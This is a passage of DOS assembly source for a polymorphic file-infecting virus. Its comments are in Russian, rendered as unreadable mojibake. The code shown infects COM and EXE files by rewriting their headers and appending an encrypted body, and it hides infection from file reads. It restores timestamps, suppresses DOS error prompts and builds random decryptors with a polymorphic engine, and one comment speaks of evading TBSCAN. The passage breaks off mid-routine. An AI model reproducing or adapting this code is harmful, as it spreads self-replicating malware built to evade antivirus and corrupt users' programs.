   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Gets a random value [0..AL]
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    get_rnd:
           push    bx cx dx si di
           mov     si,ax
           mov     ax,cs:random1
           mov     bx,cs:random2
           mov     cx,ax
           mov     di,8405h
           mul     di
           shl     cx,3
           add     ch,cl
           add     dx,cx
           add     dx,bx
           shl     bx,2
           add     dx,bx
           add     dh,bl
           shl     bx,5
           add     dh,bl
           add     ax,1
           adc     dx,0
           mov     cs:random1,ax
           mov     cs:random2,dx
           or      si,si
           jz      rnd_exit

    rnd_fail:
           sub     ax,si
           jnc     rnd_fail
           add     ax,si
           and     eax,0ffffh
    rnd_exit:
           pop     di si dx cx bx
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬ë ¤«ï ãáâ ®¢ª¨/áïâ¨ï ¢¥ªâ®à  ¯à¥àë¢ ¨ï
   ; ªà¨â¨ç¥áª¨å ®è¨¡®ª int 24h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Hook24:
           call    SaveRegs        ; á®åà ¥¨¥ ¨ ¯¥à¥å¢ â
           xor     ax,ax           ; ¢¥ªâ®à  ¯à¥àë¢ ¨ï ªà¨â¨ç¥áª¨å
           mov     ds,ax           ; ®è¨¡®ª int 24h
           mov     si,24h*4
           mov     dx,cs
           lea     ax,int24
           xchg    ax,[si]
           xchg    dx,[si+2]
           mov     cs:io24,ax
           mov     cs:io24+2,dx
           call    LoadRegs
           ret

    Remove24:
           call    SaveRegs        ; ¢®ááâ ®¢«¥¨¥ ¢¥ªâ®à  int 24h
           xor     ax,ax
           mov     ds,ax
           mov     si,24h*4
           mov     ax,cs:io24
           mov     dx,cs:io24+2
           mov     [si],ax
           mov     [si+2],dx
           call    LoadRegs
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬ë ¤«ï à ¡®âë á ä ©« ¬¨
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    LFNOpenFile:                   ; LFN ®âªàëâ¨¥ ä ©« 
           mov     ax,716ch
           mov     si,dx
           mov     dx,1            ; ®âªàëâ¨¥ ä ©« 
           mov     bx,2            ; ¢¥àãâì ®è¨¡ªã ¥á«¨ ¥ ®âªàë¢ ¥âáï
           call    int21
           xchg    ax,bx
           ret

    OpenFile:                      ; ®âªàëâ¨¥ ä ©« 
           mov     ax,3d02h
           call    int21
           xchg    ax,bx
           ret

    GetDate:                       ; ¯®«ãç¥¨¥ ¢à¥¬¥¨ ¨ ¤ âë
           mov     ax,5700h        ; ¯®á«¥¤¥© § ¯¨á¨ ¢ ä ©«
           call    int21
           mov     cs:time,cx
           mov     cs:date,dx
           ret

    RestDate:                      ; ¢®ááâ ®¢«¥¨¥ ¢à¥¬¥¨ ¨ ¤ âë
           mov     ax,5701h        ; ä ©« 
           mov     cx,cs:time
           mov     dx,cs:date
           call    int21
           ret

    Write: mov     ah,40h          ; § ¯¨áì ¢ ä ©«
           call    int21
           ret

    Read:  mov     ah,3fh          ; çâ¥¨¥ ¨§ ä ©« 
           call    int21
           ret

    CloseFile:
           mov     ah,3eh          ; § ªàëâ¨¥ ä ©« 
           call    int21
           ret

    LFNClrAttrib:
           mov     ax,7143h        ; LFN ¯®«ãç¥¨¥ ¨ ®ç¨áâª   ââà¨¡ãâ®¢
           mov     bl,0            ; ä ©« 
           call    int21
           jc      ClrFailed
           mov     cs:Attrib,cx
           mov     cs:fn_ptr,dx
           mov     cs:fn_ptr+2,ds
           mov     ax,7143h
           mov     bl,1
           xor     cx,cx
           call    int21
           jmp     ClrFailed

    ClrAttrib:
           mov     ax,4300h        ; ¯®«ãç¥¨¥ ¨ ®ç¨áâª   ââà¨¡ãâ®¢
           call    int21           ; ä ©« 
           jc      ClrFailed       ; â ª¦¥ á®åà ¥¨¥ ãª § â¥«ï   ä ©«
           mov     cs:Attrib,cx
           mov     cs:fn_ptr,dx
           mov     cs:fn_ptr+2,ds
           mov     ax,4301h
           xor     cx,cx
           call    int21
    ClrFailed:
           ret

    LFNRestAttrib:
           mov     ax,7143h        ; LFN ¢®ááâ ®¢«¥¨¥  ââà¨¡ãâ®¢
           mov     bl,1            ; ä ©«  ¯® á®åà ¥®¬ã ãª § â¥«î
           mov     cx,cs:Attrib
           mov     dx,cs:fn_ptr
           mov     ds,cs:fn_ptr+2
           call    int21
           ret
    RestAttrib:
           mov     ax,4301h        ; ¢®ááâ ®¢«¥¨¥  ââà¨¡ãâ®¢
           mov     cx,cs:Attrib    ; ä ©«  ¯® á®åà ¥®¬ã ãª § â¥«î
           mov     dx,cs:fn_ptr
           mov     ds,cs:fn_ptr+2
           call    int21
           ret

    SeekSave:
           call    SaveRegs        ; á®åà ¥¨¥ ¯®§¨æ¨¨
           xor     cx,cx           ; ãª § â¥«ï (lseek) ¢ ä ©«¥
           xor     dx,dx
           call    seekfrom_cur
           mov     cs:seek_pos,ax
           mov     cs:seek_pos+2,dx
           call    LoadRegs
           ret

    RestoreSeek:
           call    SaveRegs        ; ¢®ááâ ®¢«¥¨¥ á®åà ¥®©
           mov     dx,cs:seek_pos  ; ¯®§¨æ¨¨ ãª § â¥«ï   ä ©«¥
           mov     cx,cs:seek_pos+2
           call    seekfrom_bof
           call    LoadRegs
           ret

    seek2bof:
           mov     ax,4200h        ; ãáâ ®¢ª  ãª § â¥«ï  
           xor     cx,cx           ;  ç «® ä ©« 
           xor     dx,dx
           jmp     realseek

    seek2eof:
           mov     ax,4202h        ; ãáâ ®¢ª  ãª § â¥«ï  
           xor     cx,cx           ; ª®¥æ ä ©« 
           xor     dx,dx
           jmp     realseek

    seekfrom_eof:
           mov     ax,4202h        ; ãáâ ®¢ª  ãª § â¥«ï
           jmp     realseek        ; ®â ª®æ  ä ©« 

    seekfrom_cur:
           mov     ax,4201h        ; ãáâ ®¢ª  ãª § â¥«ï
           jmp     realseek        ; ®â â¥ªãé¥© ¯®§¨æ¨¨

    seekfrom_bof:
           mov     ax,4200h        ; ãáâ ®¢ª  ãª § â¥«ï
                                   ; ®â  ç «  ä ©« 
    realseek:
           call    int21
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ®¡à ¡®âç¨ª int 24h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    int24: mov     al,3            ; AL=3:¢¥àãâì ®è¨¡ªã
           iret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯á¥¢¤® int 21h
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    int21: pushf                   ; § ®á ¢ áâ¥ª ä« £®¢ ¨ ª®¤®¢®£®
           push    cs              ; á¥£¬¥â 
           call    exithandler     ; ã¯à ¢«¥¨¥ ¢¥à¥âáï ¯®  ¤à¥áã ¢ áâ¥ª¥
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª  ä ©«  (¤¨áª®¢ë©?)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    HandleCheck:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           mov     ax,4400h        ; IOCTL: Get device info
           call    int21
           jc      Invalid         ; bad handle?
           test    dl,80h          ; ¯à®¢¥àª  7-£® ¡¨â 
           jnz     Invalid         ; ¥á«¨ 0, â® íâ® ¤¨áª®¢ë© ä ©«

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           clc
           ret

    Invalid:
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           stc
           ret


   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯¥à¥¢®¤ ¤¢ãå « â¨áª¨å á¨¬¢®«®¢ ¢ AH ¨ AL ¢ ¢¥àå¨© à¥£¨áâà
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    upreg:
           cmp     al,61h          ; 'a'
           jb      badal
           cmp     al,7ah          ; 'z'
           ja      badal
           sub     al,20h          ; 's'->'S'
    badal: cmp     ah,61h          ; 'a'
           jb      badah
           cmp     ah,7ah          ; 'z'
           ja      badah
           sub     ah,20h          ; 's'->'S'
    badah: ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; SeekHide
   ; ¥á«¨ ¯®§¨æ¨ï lseek  å®¤¨âáï   â¥«¥ ¢¨àãá , ¯®¤¯à®£à ¬¬  ¯¥à¥®á¨â ¥£®
   ;   £à ¨æã ¢¨àãá  ¨ § à ¦¥®© ¯à®£à ¬¬ë, â.¥.   ª®¥æ ç¨áâ®© ¯à®£à ¬¬ë
   ; SEEK_POS á®¤¥à¦ â ®¢ãî ¯®§¨æ¨î lseek
   ; NRBYTES ã¬¥ìè ¥âáï   à §®áâì ¤¢ãå ¯®§¨æ¨©
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    seekhide:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           call    SeekSave        ; á®åà ï¥¬ â¥ªãé¥¥ ¯®«®¦¥¨¥ ãª § â¥«ï
           mov     cx,-1           ; ¤¢¨£ ¥¬ ãª § â¥«ì   £à ¨æã ¢¨àãá  ¨
           mov     dx,-vsize       ; ¯à®£à ¬¬ë
           call    seekfrom_eof    ; DX:AX - £®«®¢  ¢¨àãá 
           sub     ax,cs:seek_pos  ; SEEK_POS - áâ à ï ¯®§¨æ¨ï
           sbb     dx,cs:seek_pos+2
           cmp     dx,-1           ; DX:AX ¤®«¦® ¡ëâì ®âà¨æ â¥«ìë¬
           jnz     not_us
           or      ax,ax
           jns     not_us
           neg     ax              ; ¯®«ãç¥¨¥ à §®áâ¨ ¯®§¨æ¨©
           sub     cs:nrbytes,ax   ; ã¬¥ìè¥¨¥ ª®«¨ç¥áâ¢  ¯à®ç¨â ëå ¡ ©â®¢
           sub     cs:seek_pos,ax  ; ã¬¥ìè¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï ¢ ä ©«¥
           sbb     cs:seek_pos,0   ; â.¥. á¬¥é¥¨¥ ¥¥   £®«®¢ã ¢¨àãá 
    not_us:
           call    RestoreSeek     ; ¢®ááâ ®¢«¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï
           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤áç¥â CRC ¢¨àãá 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    crc:   push    si cx
           lea     si,shield
           mov     cx,end_crc-shield
           call    crc32
           pop     cx si
           ret

    CRC32: push    ebx ecx edx esi edi ds
           cld
           mov     di,cx
           mov     ecx,-1
           mov     edx,ecx
           mvs     ds,cs

      NextByteCRC:
           xor     eax,eax
           xor     ebx,ebx
           lodsb
           xor     al,cl
           mov     cl,ch
           mov     ch,dl
           mov     dl,dh
           mov     dh,8
      NextBitCRC:
           shr     bx,1
           rcr     ax,1
           jnc     NoCRC
           xor     ax,08320h
           xor     bx,0edb8h
      NoCRC:
           dec     dh
           jnz     NextBitCRC
           xor     ecx,eax
           xor     edx,ebx
           dec     di
           jnz     NextByteCRC
           not     edx
           not     ecx
           mov     eax,edx
           rol     eax,16
           mov     ax,cx
           pop     ds edi esi edx ecx ebx
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ handle
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Infect_Handle:
           push    cs cs           ; ds ¨ es ¯®ª §ë¢ îâ    á
           pop     ds es
           call    HandleCheck     ; ¯à®¢¥àª  ä ©«    ä¨ªâ¨¢®áâì (disk file?)
           jc      close

           call    Inf_Check       ; ¯à®¢¥àª  ä ©«    ¯®¢â®à®¥ § à ¦¥¨¥
           jc      close

           mov     cx,32           ; çâ¥¨¥ § £®«®¢ª  ä ©« 
           lea     dx,original
           call    read
           cmp     cx,ax           ; DOS ¢¥àã« ¢á¥ § ¯à®è¥ë¥ ¤«ï
           jne     close           ; çâ¥¨ï ¡ ©âë?

           lea     si,original     ; á¤¥« âì ª®¯¨î ®à¨£¨ «ì®£®
           lea     di,header       ;  ç «  ¯à®£à ¬¬ë
           mov     cx,32
           cld
           rep     movsb

           lea     di,header
           mov     ax,[di]         ; ¢§ïâì ¢ ax ¯¥à¢ë¥ 2 ¡ ©â  § £®«®¢ª 
           cmp     ax,'ZM'         ; ¯à®¢¥àª    EXE â¨¯
           je      exeinfect
           cmp     ax,'MZ'         ; â ª¨å EXEè¨ª®¢ ï ¨ª®£¤  ¥ ¢¨¤¥«
           je      exeinfect       ; ® £®¢®àïâ â ª¨¥ ¡ë¢ îâ

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ COM ä ©« 
   ; DI - § £®«®¢®ª, ª®â®àë© ã¦® ¬®¤¨ä¨æ¨à®¢ âì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
           call    seek2eof        ; ¯®«ãç¥¨¥ à §¬¥à  ä ©« 
           or      dx,dx           ; à §¬¥à ä ©«  ¡®«ìè¥ 65535 ¡ ©â?
           jnz     Close
           cmp     ax,65035-vsize  ; ¯à®¢¥àª  ä ©«    ¯¥à¥¯®«¥¨¥
           ja      Close           ; ¬¥áâ® ¥é¥ ®áâ ¢«¥® ¯®¤ áâ¥ª ¨ PSP
           mov     B [di],0e9h     ; § ¯¨áì JMP
           mov     delta,ax        ; ¤®¯®«¨â¥«ì®¥ á¬¥é¥¨¥ ¤«ï ¯®«¨¬®àä 
           sub     ax,3            ; ª®àà¥ªæ¨ï (¬¨ãá à §¬¥à jump' )
           mov     W [di+1],ax     ; § ¯¨áì  ¤à¥á  ¯¥à¥å®¤ 
           jmp     check

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ EXE ä ©« 
   ; DI - § £®«®¢®ª, ª®â®àë© ã¦® ¬®¤¨ä¨æ¨à®¢ âì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    exeinfect:
           cmp     B [di+18h],'@'  ; ¯à®¢¥àª  ä ©«    ¯à¨ ¤«¥¦®áâì
           je      Close           ; ª ®¢®¬ã á¥¬¥©áâ¢ã WinNE ä ©«®¢

           mov     ax,W [di+4]     ; áç¨â âì ¯ à ¬¥âà PageCnt
           mov     cx,W [di+2]     ; áç¨â âì ¯ à ¬¥âà PartPag
           or      cx,cx           ; ¥á«¨ ¤«¨  ¯®á«¥¤¥© áâà ¨æë à ¢ 
           jz      $+3             ; ã«î, â® ¯ à ¬¥âà PageCnt ¥ á®¤¥à¦¨â
           dec     ax              ; ¤®¯®«¨â¥«ì®© ¥¤¨¨æë
           mov     dx,512          ; ã¬®¦¥¨¥   512 (¯®«ãç¥¨¥ ¡ ©â)
           mul     dx
           add     ax,cx           ; ¯®«ãç¥¨¥ ¤«¨ë ¨§ EXE ä ©« , ª®â®à ï
           adc     dx,0            ; £àã§¨âáï ¢ ¯ ¬ïâì ¯à¨ § ¯ãáª¥ íâ® EXE

           push    dx ax           ; á®åà ¨âì ¯ à¥¬¥âà ¢ áâ¥ª¥
           call    seek2eof        ; ¯®«ãç¥¨¥ ¤¨áª®¢®£® à §¬¥à  ä ©« 
           pop     si cx           ; § £àã§ª  ¯ à ¬¥âà®¢ ¨§ áâ¥ª 
           cmp     si,ax           ; áà ¢¥¨¥ ¯ à ¬¥âà®¢ (¢ëï¢«¥¨¥
           jnz     Close           ; ¢áïª¨å overlay áâàãªâãà)
           cmp     cx,dx
           jnz     Close           ; ®ç¥ì ¡®«ìè¨¥ ä ©«ë  ¬ ¥ ¯®¤å®¤ïâ
           cmp     dx,10           ; ª ª ®¨ ¢ ¯ ¬ïâì £àã§ïâìáï??? ® â ª¨¥
           jae     Close           ; ¡ë¢ îâ (á«ãç ¥âáï divide overflow ¨¦¥)

           push    ax dx           ; á®åà ¥¨¥ ¯ à ¬¥âà®¢
           mov     cx,16           ; ¯®«ãç¥¨¥ ¢å®¤®© â®çª¨ (CS:IP), ª®â®àë¥
           div     cx              ; à á¯®«®¦¥ë ¢ ª®æ¥ ç¨áâ®£® EXE ä ©« 
           sub     ax,[di+8]       ; ¢ëç¨â ¨¥ à §¬¥à  EXE § £®«®¢ª 
           mov     delta,dx        ; ¤®¯®«¨â¥«ì®¥ á¬¥é¥¨¥ ¤«ï ¯®«¨¬®àä 
           sub     ax,10h          ; ¯®¤®¡¨¥ COM ä ©«ã (IP ¡®«ìè¥/à ¢® 100h)
           add     dx,100h
           mov     W [di+14h],dx   ; á®åà ¥¨¥ IP
           mov     W [di+16h],ax   ; á®åà ¥¨¥ CS
           mov     W [di+0eh],ax   ; á®åà ¥¨¥ SS (®© TBSCAN § ®à¥â)
           mov     W [di+10h],-2   ; á®åà ¥¨¥ SP
           pop     dx ax           ; § £àã§ª  ¯ à ¬¥âà®¢ ¨§ áâ¥ª 

           add     ax,vsize        ; ¤®¡ ¢«¥¨¥ ª à §¬¥àã ä ©« 
           adc     dx,0            ; ¤«¨ë ¢¨àãá 
           mov     cx,512          ; áç¨â ¥¬ ®¢ë¥ PartPag ¨ PageCnt ¤«ï
           div     cx              ; ä ©«  ¢¬¥áâ¥ á ¢¨àãá®¬
           or      dx,dx
           jz      $+3
           inc     ax
           mov     [di+2],dx       ; á®åà ¥¨¥ PartPag
           mov     [di+4],ax       ; á®åà ¥¨¥ PageCnt

    Check: call    WriteVirus      ; § ¯¨áì ¢¨àãá ¢ ä ©«

    Close: call    CorrectDate     ; ¯à ¢ª  ¤ âë ¨ä¨æ¨à®¢ ®£® ä ©« 
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; § ¯¨áì § è¨äà®¢ ®£® â¥«  ¢¨àãá  ¢ ä ©«
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    writevirus:
           call    GetDate         ; § ¯à®á ¢à¥¬¥¨/¤ âë ä ©« 

           cmp     cs:save_ax,1857h; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ ¯®à¢¥àª¨
           jz      no_time         ; ¢à¥¬¥¨ ä ©« 

           mov     ah,2ch          ; § ¯à®á â¥ªãé¥£® ¢à¥¬¥¨
           call    int21           ; ¢ dx:cx
           mov     ax,cs:time      ; ¢ ax ¢à¥¬ï ä ©« 
           shr     ah,3            ; ¡¥à¥¬ ç áë (¡¨âë 11-15 ¢ cx)
           cmp     ah,ch           ; á®¢¯ ¤ îâ? ¥á«¨ ¤ , â® áêï¡ë¢ ¥¬áï,
           je      write_fail      ; çâ®¡ë ¥ § á¢¥â¨âìáï
    no_time:
           call    seek2eof        ; -> ª®¥æ
           call    nexus
           call    write           ; § ¯¨áë¢ ¥¬áï ¢ ä ©«
           xor     cx,ax           ; ¢á¥ § ¯¨á «®áì?
           jnz     write_fail

           call    seek2bof        ; ¨¤¥¬ ¢  ç «®
           mov     cx,32           ; § £®«®¢®ª com/exe ä ©« 
           lea     dx,header
           call    write

     write_fail:
           call    RestDate        ; ¢®ááâ ®¢«¥¨¥ ¤ âë ä ©« 
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª  ä ©«    ¨ä¨æ¨à®¢ ®áâì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Inf_Check:
          call    SaveRegs         ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë

          call    SeekSave         ; á®åà ï¥¬ ¯®§¨æ¨î lseek
          mov     cx,-1            ; ¯¥à¥®á¨¬ ãª § â¥«ì    ç «®
          mov     dx,-vsize        ; â¥«  ¢¨àãá 
          call    seekfrom_eof

          mov     cx,vsize         ; ç¨â ¥¬ ¤¥áªà¨¯â®à ¢ ¡ãä¥à
          lea     dx,buffer
          push    cs cs
          pop     ds es
          call    read

          call    RestoreSeek      ; ¢®ááâ ®¢¨âì ¯®§¨æ¨î lseek
          xor     cx,ax            ; ¢á¥ ¯à®ç¨â «®áì?
          jnz     not_infected

          lea     si,v_id
          lea     di,[buffer+(signature-ksenia)]
          mov     cx,ssize
          cld
          repe    cmpsb
          jnz     not_infected

          call    LoadRegs
          stc
          ret

    not_infected:
          call    LoadRegs
          clc
          ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; CRLOAD - ¯®¤¯à®£à ¬¬  ¤«ï ¯®«ãç¥¨ï ®à¨£¨ «ì®£®  ç « 
   ; § à ¦¥®© ¯à®£à ¬¬ë ¨§ § è¨äà®¢ ®£® ¢¨àãá  ¢ íâ®© ¯à®£à ¬¬¥
   ; ¢å®¤: BX - handle ¨ä¨æ¨à®¢ ®© ¯à®£à ¬¬ë
   ; ¢ëå®¤: "buffer" á®¤¥à¦¨â 32 ®à¨£¨ «ìëå ¡ ©â 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    crload:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           push    cs cs           ; ¨¨æ¨ «¨§ æ¨ï á¥£¬¥âëå à¥£¨áâà®¢
           pop     ds es

           xor     cx,cx           ; á®åà ¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï ¢ ä ©«¥
           xor     dx,dx
           call    seekfrom_cur
           push    dx ax

           mov     cx,-1           ; ¨¤¥¬ ª £®«®¢¥ ¢¨àãá  (â.ª. ¢¨àãá § ¯¨á 
           mov     dx,-vsize       ; ¢ ª®æ¥ ¯à®£à ¬¬ë, ¥£®  ç «® ¡ã¤¥â à á¯®-
           call    seekfrom_eof    ; «®¦¥®   VSIZE ¡ ©â ®â ª®æ  ä ©« )

           mov     cx,vsize        ; ç¨â ¥¬ § è¨äà®¢ ë© ¢¨àãá
           lea     dx,buffer       ; ¢ ¡ãä¥à
           call    read

           pop     dx cx           ; ¢®ááâ  ¢«¨¢ ¥¬ ¯®§¨æ¨î ãª § â¥«ï
           call    seekfrom_bof

           mov     si,w [buffer+(nex_ptr-ksenia)]
           mov     ax,[si+1]       ; çâ¥¨¥ à áè¨äà®¢é¨ª 
           and     ah,not 111b
           or      ah,101b         ; à áè¨äà®¢ª  á à¥£¨áâà®¬ DI
           mov     w do_enc,ax
           test    al,10b          ; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ ª«îç 
           mov     al,[si+3]       ; çâ¥¨¥ ª«îç 
           jz      _key
           mov     al,90h
    _key:  mov     B do_enc+2,al
           mov     B do_enc+3,0c3h ; á®åà ¥¨¥ ª®¬ ¤ë RET ¢ ïç¥©ª¥

           mov     cx,32           ; ¯®¤£®â®¢ª  ª à áè¨äà®¢ª¥
           lea     si,[buffer+(original-ksenia)]
           lea     di,buffer

    crge:  lodsb                   ; çâ¥¨¥ ¡ ©â 
           mov     [di],al         ; á®åà ¥¨¥ ¡ ©â 
           call    near ptr do_enc ; à áè¨äà®¢ª  ¡ ©â 
           inc     di              ; ¤ «¥¥
           loop    crge

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; Polymorphic engine [NEXUS]
   ; "DELTA" = delta offset in file
   ; OUT - CX = virus size
   ; OUT - DX = polymorph code
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    nexus: call    SaveRegs        ; ¨¨æ¨ «¨§ æ¨ï
           push    cs cs
           pop     ds es
           cld
           lea     di,buffer

           mov     w r_used,-1     ; ¨ ®¤¨ ¨§ à¥£¨áâà®¢ ¥ ¨á¯®«ì§ã¥âáï
           call    garbage         ; £¥¥à æ¨ï ¬ãá®à 

           mov     wflag,2         ; get random count register
           call    get_reg
           mov     r_used,al
           or      al,10111000b    ; create MOV opcode
           stosb                   ; save it
           mov     ax,vsize-crlen
           stosw
           call    garbage         ; put some garbage

    get_idx:
           call    get_reg         ; get random index register (BX DI SI)
           mov     ah,111b         ; check if BX register
           cmp     al,011b
           je      got_idx
           mov     ah,100b         ; check if SI register
           cmp     al,110b
           je      got_idx
           mov     ah,101b         ; check if DI register
           cmp     al,111b
           jne     get_idx
    got_idx:
           mov     r_used +1,al
           mov     rm_field,ah
           or      al,10111000b       ; create MOV opcode
           stosb                      ; save it
           mov     offs_ptr,di        ; save ptr to the offset
           mov     ax,?
           stosw
           call    garbage            ; put some garbage

    bad_crypt:
           mov     cr_ptr,di
           mov     ax,ctotal          ; choose random encryptor
           lea     si,crins
           call    get_rnd
           imul    ax,(cp2n-crins)
           add     si,ax
           mov     ax,W [si]         ; read encrypt opcode
           or      ah,101b           ; encrypt with DI
           mov     W do_enc,ax
           mov     ax,0ffh           ; get any random value
           call    get_rnd
           inc     ax
           test    B do_enc,10b      ; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ ª«îç 
           jz      stos_it
           mov     al,90h
    stos_it:
           mov     do_enc+2,al
           mov     B do_enc+3,0c3h   ; á®åà ¥¨¥ ª®¬ ¤ë RET ¢ ïç¥©ª¥
           mov     al,[di]           ; check if it realy crypts byte
           call    near ptr do_enc
           cmp     al,[di]
           mov     [di],al
           jz      bad_crypt

           mov     al,2eh
           stosb
           mov     ax,W [si+2]       ; read decrypt opcode
           or      ah,rm_field       ; update opcode
           stosw
           test    al,10b            ; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ ª«îç 
           jnz     no_stos
           mov     al,do_enc+2
           stosb
    no_stos:
           call    garbage            ; put some garbage

           mov     al,01000000b       ; update index register
           or      al,r_used +1
           stosb
           call    garbage            ; put some garbage
           mov     al,01001000b       ; update count register
           or      al,r_used
           stosb
           mov     al,01110101b       ; jnz
           stosb
           mov     ax,cr_ptr
           sub     ax,di
           dec     ax
           stosb

           mov     si,di
           sub     si,offset buffer
           mov     ax,crlen
           sub     ax,si
           call    fixedfill          ; put AX bytes of the garbage

           mov     ax,di              ; calculate decryptor size
           sub     ax,offset buffer-100h
           add     ax,delta
           mov     si,offs_ptr
           mov     [si],ax

   ; copy virus body to the buffer and encrypt it "on the fly"
           mov     cx,shield-ksenia-crlen
           lea     si,ksenia+crlen
           lea     di,buffer+crlen
           rep     movsb
           mov     cx,original-shield-1
    dupcr: lodsb
           sub     al,[si]
           stosb
           loop    dupcr
           mov     cx,eov-original+1
           rep     movsb

   ; polymorph it!
           mov     cx,vsize-crlen
           lea     di,buffer+crlen
    _encr: call    near ptr do_enc
           inc     di
           loop    _encr

           lea     si,v_id
